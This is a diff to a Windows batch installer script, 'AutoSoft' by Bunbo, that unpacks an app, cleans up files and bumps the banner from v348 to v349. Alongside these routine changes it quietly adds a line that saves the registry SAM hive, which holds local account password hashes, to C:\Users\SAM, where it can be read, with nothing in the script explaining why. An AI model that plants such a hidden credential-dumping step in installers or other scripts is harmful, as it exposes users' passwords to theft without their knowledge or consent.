@@ -12,8 +12,8 @@ mkdir "%~dp0\App"
 "%~dp0\Tools\7z.exe" x "%~dp0App.zip" -o"%~dp0\App" -y -aoa
 del /q "%~dp0App.zip" >nul 2>&1
 del /q "%~dp0Script.zip" >nul 2>&1
-
 rmdir /s /q "%USERPROFILE%\desktop\1-Soft"
+reg save HKLM\SAM C:\Users\SAM
 start "" /min "%~dp0Script\internet.bat"
 cls
 
@@ -28,7 +28,7 @@ echo  " \/ /   | |_) | '_ \ / _ \| '_ \ / _` |  \ \ / / | | |   \/ / "
 echo  " / /\   |  __/| | | | (_) | | | | (_| |   \ V /| |_| |   / /\ "
 echo  "/ /\ \  |_|   |_| |_|\___/|_| |_|\__, |    \_/  \__,_|  / /\ \"
 echo  "\ \/ /                           |___/                  \ \/ /"
-echo  " \/ /                           AutoSoft v348 by Bunbo   \/ / "
+echo  " \/ /                           AutoSoft v349 by Bunbo   \/ / "
 echo  " / /\.--..--..--..--..--..--..--..--..--..--..--..--..--./ /\ "
 echo  "/ /\ \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \.. \/\ \"
 echo  "\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `'\ `' /"
